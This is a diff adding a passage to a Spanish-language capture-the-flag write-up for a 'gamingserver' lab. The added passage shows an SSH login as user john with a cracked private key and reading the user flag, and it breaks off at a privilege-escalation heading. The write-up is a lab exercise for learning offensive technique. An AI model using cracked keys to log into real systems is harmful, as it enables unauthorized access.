@@ -169,8 +169,37 @@ Enunciado : Obtener  flags de usuario y root.
         
         1 password hash cracked, 0 left
 
-        
+## Conectamos por el servicio SSH
+                                                                                                                                                                                  
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/gamingserver/content]
+    └─# ssh john@10.10.92.221 -i id_rsa
+    The authenticity of host '10.10.92.221 (10.10.92.221)' can't be established.
+    ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
+    This host key is known by the following other names/addresses:
+        ~/.ssh/known_hosts:37: [hashed name]
+        ~/.ssh/known_hosts:39: [hashed name]
+    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+    Warning: Permanently added '10.10.92.221' (ED25519) to the list of known hosts.
+    Enter passphrase for key 'id_rsa': 
 
+    Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+    
+    Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
+    john@exploitable:~$ 
+
+
+ ## Postexplotacion elevamos privilegios, Flags
+
+-Obtenemos flag de usuario
+
+    john@exploitable:~$ cd /home/john/
+   
+    john@exploitable:~$ cat user.txt 
+    a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
+
+-Elevamos privilegios root.
+
+    
 
     
                                                                    
